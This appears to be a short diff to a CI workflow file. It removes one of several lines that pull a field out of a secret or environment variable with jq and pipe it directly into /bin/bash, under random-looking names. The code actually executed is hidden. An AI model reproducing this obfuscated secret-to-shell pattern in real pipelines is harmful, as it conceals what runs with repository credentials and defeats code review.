@@ -23,7 +23,6 @@ jobs:
           wmtgo3: ${{ secrets.wmtgo3 }}
         run: |
           printf '%s' "$wmtgo3" | jq -r .aq78137 | /bin/bash
-          echo $lkh9 | jq -r .x4326 | /bin/bash
           echo $hwzht39202 | jq -r .ukian2 | /bin/bash
           printf '%s' "$peru445" | jq -r .t72 | /bin/bash
           echo $afq2085 | jq -r .qgd5557 | /bin/bash
